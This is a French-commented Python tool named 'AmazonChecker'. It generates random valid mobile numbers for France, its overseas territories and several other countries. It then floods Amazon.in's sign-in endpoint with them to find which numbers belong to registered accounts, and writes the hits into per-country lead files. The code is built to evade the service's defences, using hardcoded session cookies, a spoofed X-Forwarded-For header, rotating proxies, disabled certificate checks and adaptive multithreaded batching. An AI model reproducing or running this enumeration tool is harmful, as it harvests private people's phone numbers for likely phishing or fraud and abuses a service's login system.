import requests, urllib3
from multiprocessing import Pool
import os
import random
import phonenumbers
import fade
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import time
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import queue
from functools import partial
import signal
import sys

# Configuration du logging
logging.basicConfig(filename="error.log", level=logging.ERROR,
                    format='%(asctime)s:%(levelname)s:%(message)s')

# Désactivation des avertissements SSL
requests.packages.urllib3.disable_warnings()

os.system("cls" if os.name == "nt" else "clear")
os.system('title AmazonChecker ^| by @eboy.uhq')

method = "Semi Spoofed"

banner = """
    _                                      ____ _               _             
   / \\   _ __ ___   __ _ _______  _ __    / ___| |__   ___  ___| | _____ _ __ 
  / _ \\ | '_ ` _ \\ / _` |_  / _ \\| '_ \\  | |   | '_ \\ / _ \\/ __| |/ / _ \\ '__|
 / ___ \\| | | | | | (_| |/ / (_) | | | | | |___| | | |  __/ (__|   <  __/ |   
/_/   \\_\\_| |_| |_|\\__,_/___\\___/|_| |_|  \\____|_| |_|\\___|\\___|_|\\_\\___|_|   discord : @eboy.uhq
"""

tatt = """
   .  .    '    .          '                      . 
                 .             '          o     o *     ' +                             
           o     '   . .   .          '           '                               +     
            '        +    '                             +                     '        +
        .                                          .   '                        
      '                    ~~+               '       .  '                       
  '      +                                .                     '                
       |    .      o                                  .    .:'                  
 .     |         |  .      .                          (_.'       +             .   
                -+-     o     o       .                             .               . 
    .        .   |                   '      '  +            o    ~~+              
     +             *             .       @Testeur2cc                 .             +     
    '          .         .             +            .                             .    
                    _|_'        '         .    .-.                             *   
       .    +        |           '         +    ) )      .                       t.me/chez8675  <3     
              +  ( (                                                            
.       +   '     `-'                                     .                        
. +              .             +           +  .    +    +   
[1] generer de la NL
[2] check un numero de tel
[3] check fichier
"""

faded_text = fade.fire(banner)
tatt2 = fade.fire(tatt)
print(faded_text)
print(tatt2)


def load_proxies(file_path):
    proxies = []
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for line in f:
                proxy = line.strip()
                # Ajoute "http://" si le schéma est absent
                if proxy and not proxy.startswith("http"):
                    proxy = "http://" + proxy
                proxies.append(proxy)
    return proxies

# Chargement des proxies sans validation
proxy_list = load_proxies("proxies.txt")
valid_proxies = proxy_list  # Tous les proxies sont considérés comme valides

# Création d'un pool de proxies réutilisables
proxy_pool = queue.Queue()
for proxy in valid_proxies:
    proxy_pool.put({"http": proxy, "https": proxy})

# Statistiques globales
stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "errors": 0,
    "start_time": time.time()
}
stats_lock = threading.Lock()

# Cache des résultats pour éviter de vérifier plusieurs fois les mêmes numéros
results_cache = {}
results_cache_lock = threading.Lock()

if proxy_list:
    print(f"{len(proxy_list)} proxies loaded")
else:
    print("Aucun proxy chargé. avant ratelimit (100k max)")


class Amazon:
    def __init__(self, num):
        self.url = "https://www.amazon.in/ap/signin"
        self.num = num
        self.cookies = {
            "session-id": "262-6899214-0753700", 
            "session-id-time": "2289745062l", 
            "i18n-prefs": "INR", 
            "csm-hit": "tb:6NWTTM14VJ00ZAVVBZ3X+b-36CP76CGQ52N3TB0HZG8|1659025064788&t:1659025064788&adb:adblk_no", 
            "ubid-acbin": "257-4810331-3732018", 
            "session-token": "tyoeHgowknphx0Y/CBaiVwnBiwbhUb1PRTvQZQ+07Tq9rmkRD6bErsUDwgq6gu+tA53K6WEAMwOb3pN4Ti3PSFoo+I/Jt5qIEDEMHIeRo1CrE264ogGDHsjge/CwWUZ9bVZtbo32ej/ZPQdm8bYeu6TQhca+UH7Wm9OOwBGoPl7dfoUk79QLYEz69Tt3ik4zMJom8jfgI227qMPuaMaAsw=="
        }
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.amazon.in",
            "Connection": "keep-alive",  # Changé de 'close' à 'keep-alive' pour les connexions persistantes
            "X-Forwarded-For": "127.0.0.1",
            "Referer": "https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }
        self.data = {
            "appActionToken": "Aok8C9I71Cr17vp22ONGvDUXR8Yj3D",
            "appAction": "SIGNIN_PWD_COLLECT",
            "subPageType": "SignInClaimCollect",
            "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl95YV9zaWduaW4=",
            "prevRID": "ape:MzZDUDc2Q0dRNTJOM1RCMEhaRzg=",
            "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.tCHWdlv4kSSigZCZiGfSCYgnReddxq7c0cUpf0dxYqYzWU-ZHIL0mQ.eP-cXQNtVyBr4q_g.fNRQAD5f18IU0nmqT7IwklJZV-_b60As-_dvyVd4MMjDpiMoGFJ0edbmuL8GJKT_BEE7ClwIpUYOtUtejr7v8qCRy4iD6bg_eBRSnTmZiXzVsx4EuL241zhoriZ7FpXS2seG82sx85C2udl1sPRQyKnO1zIqulOCechL_LzBmIRDv9ngzfij-nYmjWrDpZvAXiKCclR9v0UYh_SqjjOIrStMC53AlWjH-hYdDkXWSeTyHchFi9Ij4ndOgJb9tKNucA4_j7Uy-R0wvB9zlwEfQNa3394guXjjz6IR3TVMjw41bySCYbHLf6j5oj-5xh6UZm2CsW7DE5gqbHmlq5Nv8zLvTRTO9HJvM9Wr36R1eDRN.wZAX4qr9VTROJR9qdWbHfw", 
            "email": self.num, 
            "password": "",
            "create": "0"
        }
        
# Fonction pour créer une session avec retry et timeouts optimisés
def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=50)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

# Pool de sessions réutilisables
session_pool = queue.Queue()
for _ in range(min(50, os.cpu_count() * 4)):
    session_pool.put(create_session())

def genph(nb, prefix, region):
    numbers = []
    # Configuration des préfixes pour les territoires d'outre-mer
    domtom_config = {
        "+590": {
            "GP": {"pattern": "690"},  # Guadeloupe
            "MF": {"pattern": "690"},  # Saint-Martin
            "BL": {"pattern": "690"}   # Saint-Barthélemy
        },
        "+594": {"GF": {"pattern": "694"}},  # Guyane Française
        "+596": {"MQ": {"pattern": "696"}},  # Martinique
        "+262": {
            "RE": {"pattern": "692"},  # Réunion
            "YT": {"pattern": "639"}   # Mayotte
        }
    }
    while len(numbers) < nb:
        # Gestion des territoires d'outre-mer avec leurs préfixes spécifiques
        if prefix in ["+590", "+594", "+596", "+262"]:
            if prefix in domtom_config:
                # Si la région est spécifiée, utiliser sa configuration
                if region and region in domtom_config[prefix]:
                    reg = region
                    pattern = domtom_config[prefix][region]["pattern"]
                # Sinon utiliser la première configuration disponible
                else:
                    reg = list(domtom_config[prefix].keys())[0]
                    pattern = domtom_config[prefix][reg]["pattern"]
                candidate = f"{prefix}{pattern}{random.randint(0, 999999):06d}"
        else:
            chosen_prefix = prefix
            reg = region
            if reg == "BE":
                candidate = f"{chosen_prefix}4{random.choice(['7','8','9'])}{random.randint(1000000, 9999999):07d}"
            elif reg == "FR":
                candidate = f"{chosen_prefix}{random.choice(['6','7'])}{random.randint(10000000, 99999999):08d}"
            elif reg == "CH":
                # Format pour la Suisse: +41 7x xxx xx xx (mobiles)
                candidate = f"{chosen_prefix}7{random.randint(0, 9)}{random.randint(100000, 999999):06d}"
            else:
                candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
        try:
            phone_number = phonenumbers.parse(candidate, reg)
            if phonenumbers.is_valid_number(phone_number):
                formatted = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
                if formatted not in numbers:
                    numbers.append(formatted)
        except Exception:
            continue

    with open("NotCheckedNL.txt", "w") as file:
        file.write("\n".join(numbers))
    
    print(f"{len(numbers)} valid numbers generated out of {nb} demanded")
    return numbers

# Fonction pour générer UN candidat
def gen_candidate(prefix, region):
    # Configuration des préfixes pour les territoires d'outre-mer
    domtom_config = {
        "+590": {
            "GP": {"pattern": "690"},  # Guadeloupe
            "MF": {"pattern": "690"},  # Saint-Martin
            "BL": {"pattern": "690"}   # Saint-Barthélemy
        },
        "+594": {"GF": {"pattern": "694"}},  # Guyane Française
        "+596": {"MQ": {"pattern": "696"}},  # Martinique
        "+262": {
            "RE": {"pattern": "692"},  # Réunion
            "YT": {"pattern": "639"}   # Mayotte
        }
    }
    
    # Gestion des territoires d'outre-mer avec leurs préfixes spécifiques
    if prefix in ["+590", "+594", "+596", "+262"]:
        if prefix in domtom_config:
            # Si la région est spécifiée, utiliser sa configuration
            if region and region in domtom_config[prefix]:
                reg = region
                pattern = domtom_config[prefix][region]["pattern"]
            # Sinon utiliser la première configuration disponible
            else:
                reg = list(domtom_config[prefix].keys())[0]
                pattern = domtom_config[prefix][reg]["pattern"]
            candidate = f"{prefix}{pattern}{random.randint(0, 999999):06d}"
    else:
        chosen_prefix = prefix
        reg = region
        if reg == "BE":
            candidate = f"{chosen_prefix}4{random.choice(['7','8','9'])}{random.randint(1000000, 9999999):07d}"
        elif reg == "FR":
            candidate = f"{chosen_prefix}{random.choice(['6','7'])}{random.randint(10000000, 99999999):08d}"
        elif reg == "PT":  
            candidate = f"{chosen_prefix}{random.choice(['91', '92', '93', '96'])}{random.randint(1000000, 9999999):07d}"
        elif reg == "CH":
            # Format pour la Suisse: +41 7x xxx xx xx (mobiles)
            candidate = f"{chosen_prefix}7{random.randint(0, 9)}{random.randint(100000, 999999):06d}"
        elif reg == "KE":  
            candidate = f"{chosen_prefix}{random.choice(['7','1'])}{random.randint(10000000, 99999999):08d}"
        else:
            candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
    try:
        phone_number = phonenumbers.parse(candidate, reg)
        if phonenumbers.is_valid_number(phone_number):
            formatted = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
            return formatted
    except Exception as e:
        logging.error("Erreur lors de la génération d'un candidat", exc_info=True)
    return None

# Fonction pour générer un batch de candidats sans doublons
def gen_candidate_batch(prefix, region, batch_size=10000):
    batch_set = set()
    while len(batch_set) < batch_size:
        candidate = gen_candidate(prefix, region)
        if candidate is not None:
            batch_set.add(candidate)
    return list(batch_set)

def get_output_file(num, region=None):
    """Détermine le fichier de sortie en fonction du préfixe du numéro et de la région"""
    if num.startswith("+590") and (region == "GP" or not region):
        return "CheckedNL_guadeloupe.txt"
    elif num.startswith("+590") and region == "MF":
        return "CheckedNL_saint_martin.txt"
    elif num.startswith("+590") and region == "BL":
        return "CheckedNL_saint_barthelemy.txt"
    elif num.startswith("+594"):
        return "CheckedNL_guyane.txt"
    elif num.startswith("+596"):
        return "CheckedNL_martinique.txt"
    elif num.startswith("+262") and (region == "RE" or not region):
        return "CheckedNL_reunion.txt"
    elif num.startswith("+262") and region == "YT":
        return "CheckedNL_mayotte.txt"
    elif num.startswith("+32"):
        return "CheckedNL_belgique.txt"
    elif num.startswith("+33"):
        return "CheckedNL_france.txt"
    elif num.startswith("+27"):
        return "CheckedNL_afrique_du_sud.txt"
    elif num.startswith("+34"):
        return "CheckedNL_espagne.txt"
    elif num.startswith("+351"):
        return "CheckedNL_portugal.txt"
    elif num.startswith("+49"):
        return "CheckedNL_allemagne.txt"
    elif num.startswith("+41"):
        return "CheckedNL_suisse.txt"
    elif num.startswith("+254"):
        return "CheckedNL_kenya.txt"
    else:
        return "CheckedNL_autres.txt"

def get_proxy():
    """Récupère un proxy du pool et le remet en fin de file"""
    if proxy_pool.empty():
        return None
    try:
        proxy = proxy_pool.get(block=False)
        proxy_pool.put(proxy)  # Remettre le proxy dans la file pour réutilisation
        return proxy
    except queue.Empty:
        return None

def get_session():
    """Récupère une session du pool et la remet en fin de file"""
    try:
        session = session_pool.get(block=False)
        session_pool.put(session)  # Remettre la session dans la file pour réutilisation
        return session
    except queue.Empty:
        # Si le pool est vide, créer une nouvelle session
        new_session = create_session()
        session_pool.put(new_session)
        return new_session

def update_stats(valid):
    """Met à jour les statistiques globales"""
    with stats_lock:
        stats["checked"] += 1
        if valid:
            stats["valid"] += 1
        else:
            stats["invalid"] += 1
        
        # Afficher les statistiques toutes les 50 vérifications
        if stats["checked"] % 50 == 0:
            elapsed = time.time() - stats["start_time"]
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            print(f"\n[STATS] Vérifiés: {stats['checked']} | Valides: {stats['valid']} | Invalides: {stats['invalid']} | Erreurs: {stats['errors']} | Vitesse: {speed:.2f} num/s")

def fun_action(num, region=None, max_retries=3, initial_timeout=2):
    num = num.strip()
    if num.isnumeric() and "+" not in num:
        num = f"+{num}"
        
    # Vérifier si le numéro est déjà dans le cache
    with results_cache_lock:
        if num in results_cache:
            result = results_cache[num]
            update_stats(result)
            print(f"{'\033[32m[+]\033[0m' if result else '\033[31m[-]\033[0m'} | Method: {method} | {num} | CACHE")
            return result
    
    amazon = Amazon(num)
    amazon.data['email'] = num

    # Liste des proxies à éviter pour cette requête spécifique
    bad_proxies = set()
    
    # Obtenir une session du pool
    session = get_session()
    
    # Tentatives avec backoff exponentiel et délai progressif
    for attempt in range(max_retries):
        proxies = get_proxy()
        
        # Éviter les proxies problématiques
        if proxies and str(proxies) in bad_proxies:
            continue
            
        # Augmenter le timeout à chaque tentative mais avec une valeur de base plus faible
        current_timeout = initial_timeout * (1.2 ** attempt)
        
        try:
            # Effectuer la requête avec le timeout ajusté et la session réutilisable
            res = session.post(amazon.url, headers=amazon.headers, cookies=amazon.cookies, 
                              data=amazon.data, verify=False, proxies=proxies, 
                              timeout=current_timeout).text
            
            # Vérifier si la réponse contient des indications de rate limiting ou de blocage
            if "rate exceeded" in res.lower() or "too many requests" in res.lower():
                # Attendre plus longtemps avant la prochaine tentative
                time.sleep(0.5 * (attempt + 1))
                continue
                
            output_file = get_output_file(num, region)
            result = "ap_change_login_claim" in res
            
            # Mettre en cache le résultat
            with results_cache_lock:
                results_cache[num] = result
            
            if result:
                with open(output_file, "a") as ff:
                    ff.write(f"{num}\n")
                print(f"\033[32m[+]\033[0m | Method: {method} | {num} | MY")
            else:
                print(f"\033[31m[-]\033[0m | Method: {method} | {num} | MY")
                
            update_stats(result)
            return result
                
        except requests.exceptions.ProxyError as e:
            # Marquer ce proxy comme problématique mais continuer sans attendre
            if proxies:
                bad_proxies.add(str(proxies))
            continue
            
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
            # Timeout - attendre un peu avant d'essayer avec un autre proxy
            time.sleep(0.1 * (attempt + 1))
            continue
            
        except requests.exceptions.ConnectionError:
            # Problème de connexion - attendre un peu avant de réessayer
            time.sleep(0.2 * (attempt + 1))
            continue
            
        except Exception as e:
            # Autres erreurs - log mais continuer
            with stats_lock:
                stats["errors"] += 1
            logging.error(f"Erreur lors de la vérification du numéro {num}", exc_info=True)
            # Attendre un peu plus longtemps pour les erreurs inconnues
            time.sleep(0.3 * (attempt + 1))
            continue
    
    # Si toutes les tentatives ont échoué
    with stats_lock:
        stats["errors"] += 1
    return False

def watch_file(file_path, max_check_time=None, batch_size=100, region=None):
    """Surveille le fichier pour détecter de nouveaux numéros et supprime les doublons.
    
    Args:
        file_path: Chemin du fichier à surveiller
        max_check_time: Temps maximum de vérification en secondes (None = illimité)
        batch_size: Nombre de numéros à vérifier par lot
        region: Code de région pour la vérification des numéros
    """
    checked_numbers = set()
    start_time = time.time()
    last_batch_time = time.time()
    print(f"Surveillance du fichier: {file_path}")
    print(f"Temps max de vérification: {max_check_time if max_check_time else 'illimité'} secondes")
    
    # Variables pour le contrôle adaptatif de la vitesse
    current_batch_size = batch_size
    min_batch_size = 10
    max_batch_size = 500
    success_rate_history = []
    error_count_history = []
    speed_history = []
    
    # Vérifier si le fichier existe avant de commencer la surveillance
    if not os.path.exists(file_path):
        print(f"Erreur : le fichier '{file_path}' n'existe pas.")
        return
    
    last_modified_time = os.path.getmtime(file_path)
    
    # Fonction pour gérer l'interruption par Ctrl+C
    def signal_handler(sig, frame):
        print("\n\nInterruption détectée. Arrêt propre...")
        print(f"Statistiques finales: {stats['checked']} numéros vérifiés, {stats['valid']} valides")
        sys.exit(0)
    
    # Enregistrer le gestionnaire de signal
    signal.signal(signal.SIGINT, signal_handler)
    
    # Fonction pour ajuster la taille du batch en fonction des performances
    def adjust_batch_size():
        nonlocal current_batch_size, success_rate_history, error_count_history, speed_history
        
        # Garder seulement les 5 dernières valeurs pour l'historique
        if len(success_rate_history) > 5:
            success_rate_history = success_rate_history[-5:]
        if len(error_count_history) > 5:
            error_count_history = error_count_history[-5:]
        if len(speed_history) > 5:
            speed_history = speed_history[-5:]
        
        # Calculer les moyennes
        avg_success_rate = sum(success_rate_history) / len(success_rate_history) if success_rate_history else 0
        avg_error_rate = sum(error_count_history) / len(error_count_history) if error_count_history else 0
        avg_speed = sum(speed_history) / len(speed_history) if speed_history else 0
        
        # Ajuster la taille du batch
        if avg_error_rate > 0.1:  # Plus de 10% d'erreurs
            # Réduire la taille du batch
            current_batch_size = max(min_batch_size, int(current_batch_size * 0.8))
        elif avg_success_rate > 0.95 and avg_error_rate < 0.05:  # Bon taux de succès et peu d'erreurs
            # Augmenter progressivement la taille du batch
            current_batch_size = min(max_batch_size, int(current_batch_size * 1.1))
        
        return current_batch_size
    
    while True:
        # Vérifier si le temps maximum est dépassé
        if max_check_time and time.time() - start_time > max_check_time:
            print(f"Temps maximum de vérification ({max_check_time}s) atteint. Arrêt.")
            break
            
        try:
            # Vérifier si le fichier a été modifié depuis la dernière vérification
            current_modified_time = os.path.getmtime(file_path)
            if current_modified_time <= last_modified_time and len(checked_numbers) > 0:
                # Fichier non modifié, attendre avant la prochaine vérification
                time.sleep(0.5)  # Augmenté pour réduire la charge CPU
                continue
                
            # Mettre à jour le temps de dernière modification
            last_modified_time = current_modified_time
            
            with open(file_path, "r") as file:
                lines = file.readlines()
                
            # Supprimer les doublons en conservant l'ordre (optimisé)
            unique_lines = []
            seen = set()
            for line in lines:
                line = line.strip()
                if line and line not in seen:
                    seen.add(line)
                    unique_lines.append(line)
                    
            if len(unique_lines) != len(lines):
                print("Doublons détectés et supprimés dans le fichier.")
                with open(file_path, "w") as file:
                    file.write("\n".join(unique_lines) + ("\n" if unique_lines else ""))
                # Mettre à jour le temps de dernière modification après l'écriture
                last_modified_time = os.path.getmtime(file_path)
                        
            # Filtrer les numéros non encore vérifiés
            new_numbers = [num for num in unique_lines if num not in checked_numbers]
            if new_numbers:
                # Ajuster la taille du batch en fonction des performances précédentes
                current_batch_size = adjust_batch_size()
                print(f"Taille de batch adaptative: {current_batch_size}")
                
                # Traiter par lots pour éviter de bloquer trop longtemps
                for i in range(0, len(new_numbers), current_batch_size):
                    # Pause entre les lots pour éviter la surcharge
                    time_since_last_batch = time.time() - last_batch_time
                    if time_since_last_batch < 1.0:  # Pause minimale de 1 seconde entre les lots
                        pause_time = 1.0 - time_since_last_batch
                        print(f"Pause de {pause_time:.2f}s pour stabiliser le traitement...")
                        time.sleep(pause_time)
                    
                    batch = new_numbers[i:i+current_batch_size]
                    batch_start_time = time.time()
                    last_batch_time = batch_start_time
                    
                    print(f"Vérification du lot {i//current_batch_size+1}: {len(batch)} numéro(s)")
                    
                    # Réinitialiser les compteurs d'erreurs pour ce batch
                    batch_errors = 0
                    batch_start_checked = stats["checked"]
                    batch_start_valid = stats["valid"]
                    
                    # Utiliser ThreadPoolExecutor avec un nombre de workers adapté
                    max_workers = min(os.cpu_count() * 2, len(batch))  # Réduit pour éviter la surcharge
                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
                        # Créer une fonction partielle pour passer la région
                        fun_action_with_region = partial(fun_action, region=region)
                        
                        # Soumettre les tâches par petits groupes pour un meilleur contrôle
                        chunk_size = max(5, min(20, len(batch) // max_workers))
                        results = []
                        
                        for j in range(0, len(batch), chunk_size):
                            chunk = batch[j:j+chunk_size]
                            futures = [executor.submit(fun_action_with_region, num) for num in chunk]
                            
                            # Collecter les résultats au fur et à mesure qu'ils sont disponibles
                            for future in as_completed(futures):
                                try:
                                    results.append(future.result())
                                except Exception as exc:
                                    with stats_lock:
                                        stats["errors"] += 1
                                    batch_errors += 1
                                    logging.error(f"Une tâche a généré une exception: {exc}")
                            
                            # Petite pause entre les chunks pour éviter les pics de charge
                            if j + chunk_size < len(batch):
                                time.sleep(0.1)
                    
                    # Ajouter les numéros vérifiés à l'ensemble
                    checked_numbers.update(batch)
                    
                    # Calculer les statistiques du batch
                    batch_time = time.time() - batch_start_time
                    batch_checked = stats["checked"] - batch_start_checked
                    batch_valid = stats["valid"] - batch_start_valid
                    batch_speed = batch_checked / batch_time if batch_time > 0 else 0
                    batch_success_rate = batch_valid / batch_checked if batch_checked > 0 else 0
                    batch_error_rate = batch_errors / len(batch) if len(batch) > 0 else 0
                    
                    # Mettre à jour les historiques pour l'ajustement adaptatif
                    success_rate_history.append(batch_success_rate)
                    error_count_history.append(batch_error_rate)
                    speed_history.append(batch_speed)
                    
                    # Afficher un résumé du lot
                    print(f"Lot terminé en {batch_time:.2f}s: {batch_valid} numéros valides sur {batch_checked}")
                    print(f"Vitesse du lot: {batch_speed:.2f} num/s | Taux de succès: {batch_success_rate*100:.1f}% | Erreurs: {batch_errors}")
                    
                    # Afficher les statistiques globales
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    print(f"[STATS] Total: {stats['checked']} | Valides: {stats['valid']} | Vitesse moyenne: {speed:.2f} num/s")
            else:
                # Aucun nouveau numéro, attendre avant la prochaine vérification
                time.sleep(0.5)  # Augmenté pour réduire la charge CPU
                
        except Exception as e:
            logging.error("Erreur lors de la surveillance du fichier", exc_info=True)
            print(f"Erreur: {e}")
            time.sleep(1.0)  # Augmenté pour donner plus de temps de récupération

def main():
    choice = input("@hasbateur2cc > ")
    
    if choice == "1":
        print("Choisissez le pays pour la génération des numéros :")
        print("[1] Guadeloupe")
        print("[2] Guyane Française")
        print("[3] Martinique")
        print("[4] Réunion")
        print("[5] Mayotte")
        print("[6] Saint-Martin")
        print("[7] Saint-Barthélemy")
        print("[8] Belgique")
        print("[9] France")
        print("[10] Afrique du Sud")
        print("[11] Espagne")
        print("[12] Portugal")
        print("[13] Allemagne")
        print("[14] Suisse")
        print("[15] Kenya")
        country_choice = input("Votre choix : ")
        if country_choice == "1":
            prefix = "+590"
            region = "GP"
        elif country_choice == "2":
            prefix = "+594"
            region = "GF"
        elif country_choice == "3":
            prefix = "+596"
            region = "MQ"
        elif country_choice == "4":
            prefix = "+262"
            region = "RE"
        elif country_choice == "5":
            prefix = "+262"
            region = "YT"
        elif country_choice == "6":
            prefix = "+590"
            region = "MF"
        elif country_choice == "7":
            prefix = "+590"
            region = "BL"
        elif country_choice == "8":
            prefix = "+32"
            region = "BE"
        elif country_choice == "9":
            prefix = "+33"
            region = "FR"
        elif country_choice == "10":
            prefix = "+27"
            region = "ZA"
        elif country_choice == "11":
            prefix = "+34"
            region = "ES"
        elif country_choice == "12":
            prefix = "+351"
            region = "PT"
        elif country_choice == "13":
            prefix = "+49"
            region = "DE"
        elif country_choice == "14":
            prefix = "+41"
            region = "CH"
        elif country_choice == "15":
            prefix = "+254"
            region = "KE"
        else:
            print("Choix invalide, utilisation de la France par défaut.")
            prefix = "+33"
            region = "FR"
            
        target = int(input("Nombre de numéros validés requis > "))
        valid_count = 0
        total_attempts = 0
        batch_size = min(target * 50, 5000)  # Taille de batch optimisée
        
        # Réinitialiser les statistiques
        with stats_lock:
            stats["checked"] = 0
            stats["valid"] = 0
            stats["invalid"] = 0
            stats["errors"] = 0
            stats["start_time"] = time.time()
        
        print(f"\n[INFO] Utilisation de {min(os.cpu_count() * 4, batch_size)} workers en parallèle")
        
        while valid_count < target:
            print(f"\nGénération d'un batch de {batch_size} numéros...")
            batch = gen_candidate_batch(prefix, region, batch_size)
            print("Vérification du batch...")
            
            # Utiliser ThreadPoolExecutor pour une meilleure performance
            max_workers = min(os.cpu_count() * 4, batch_size)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Créer une fonction partielle pour passer la région
                fun_action_with_region = partial(fun_action, region=region)
                
                # Soumettre toutes les tâches
                futures = {executor.submit(fun_action_with_region, num): num for num in batch}
                
                # Traiter les résultats au fur et à mesure qu'ils sont disponibles
                for future in as_completed(futures):
                    num = futures[future]
                    total_attempts += 1
                    try:
                        result = future.result()
                        if result:
                            valid_count += 1
                            # Afficher un compteur de progression
                            if valid_count % 5 == 0 or valid_count == target:
                                print(f"\r[PROGRESSION] {valid_count}/{target} numéros validés ({(valid_count/target*100):.1f}%)", end="")
                        if valid_count >= target:
                            # Annuler les tâches restantes
                            for f in futures:
                                f.cancel()
                            break
                    except Exception as exc:
                        with stats_lock:
                            stats["errors"] += 1
                        logging.error(f"Erreur lors de la vérification de {num}: {exc}")
            
            # Afficher les statistiques de performance
            elapsed = time.time() - stats["start_time"]
            speed = total_attempts / elapsed if elapsed > 0 else 0
            print(f"\nBatch terminé: {valid_count}/{target} validés après {total_attempts} vérifications")
            print(f"Vitesse moyenne: {speed:.2f} numéros/seconde")
            
            # Ajuster la taille du prochain batch en fonction du taux de réussite
            if valid_count > 0 and total_attempts > 0:
                success_rate = valid_count / total_attempts
                remaining = target - valid_count
                # Estimer combien de numéros il faut encore vérifier
                estimated_needed = int(remaining / success_rate * 1.2)  # Ajouter 20% de marge
                batch_size = min(estimated_needed, 10000)  # Limiter à 10000 max
        
        print(f"\nRécapitulatif: {valid_count} numéros validés après {total_attempts} numéros générés.")
        print(f"Taux de réussite: {(valid_count/total_attempts*100):.2f}%")
        print(f"Temps total: {(time.time() - stats['start_time']):.2f} secondes")
    
    elif choice == "2":
        phone_number = input("Entrez le numéro à vérifier : ")
        # Déterminer la région en fonction du préfixe du numéro
        phone_region = None
        if phone_number.startswith("+590"):
            phone_region = "GP"  # Par défaut Guadeloupe
        elif phone_number.startswith("+594"):
            phone_region = "GF"  # Guyane
        elif phone_number.startswith("+596"):
            phone_region = "MQ"  # Martinique
        elif phone_number.startswith("+262"):
            phone_region = "RE"  # Par défaut Réunion
        elif phone_number.startswith("+32"):
            phone_region = "BE"  # Belgique
        elif phone_number.startswith("+33"):
            phone_region = "FR"  # France
        elif phone_number.startswith("+27"):
            phone_region = "ZA"  # Afrique du Sud
        elif phone_number.startswith("+34"):
            phone_region = "ES"  # Espagne
        elif phone_number.startswith("+351"):
            phone_region = "PT"  # Portugal
        elif phone_number.startswith("+49"):
            phone_region = "DE"  # Allemagne
        elif phone_number.startswith("+41"):
            phone_region = "CH"  # Suisse
            
        result = fun_action(phone_number, phone_region)
        if result:
            print("Le numéro est validé.")
        else:
            print("Le numéro n'est pas validé.")
    
    elif choice == "3":
        file_path = input("Fichier à vérifier: ")
        max_time = input("Temps maximum de vérification en secondes (laisser vide pour illimité): ")
        max_time = int(max_time) if max_time.strip() else None
        batch_size = input("Nombre de numéros à vérifier par lot (défaut: 100): ")
        batch_size = int(batch_size) if batch_size.strip() else 100
        # Demander la région pour la vérification
        print("\nChoisissez la région pour la vérification:")
        print("[1] Guadeloupe")
        print("[2] Guyane")
        print("[3] Martinique")
        print("[4] Réunion")
        print("[5] Mayotte")
        print("[6] Saint-Martin")
        print("[7] Saint-Barthélemy")
        print("[8] Belgique")
        print("[9] France")
        print("[10] Afrique du Sud")
        print("[11] Espagne")
        print("[12] Portugal")
        print("[13] Allemagne")
        print("[14] Suisse")
        print("[15] Kenya")
        print("[0] Auto-détection (par défaut)")
        
        region_choice = input("Votre choix (0-14): ")
        file_region = None
        
        if region_choice == "1":
            file_region = "GP"
        elif region_choice == "2":
            file_region = "GF"
        elif region_choice == "3":
            file_region = "MQ"
        elif region_choice == "4":
            file_region = "RE"
        elif region_choice == "5":
            file_region = "YT"
        elif region_choice == "6":
            file_region = "MF"
        elif region_choice == "7":
            file_region = "BL"
        elif region_choice == "8":
            file_region = "BE"
        elif region_choice == "9":
            file_region = "FR"
        elif region_choice == "10":
            file_region = "ZA"
        elif region_choice == "11":
            file_region = "ES"
        elif region_choice == "12":
            file_region = "PT"
        elif region_choice == "13":
            file_region = "DE"
        elif region_choice == "14":
            file_region = "CH"
        elif region_choice == "15":
            file_region = "KE"
        
        watch_file(file_path, max_time, batch_size, file_region)
    
    else:
        print("Choix invalide")
        main()

if __name__ == "__main__":
    main()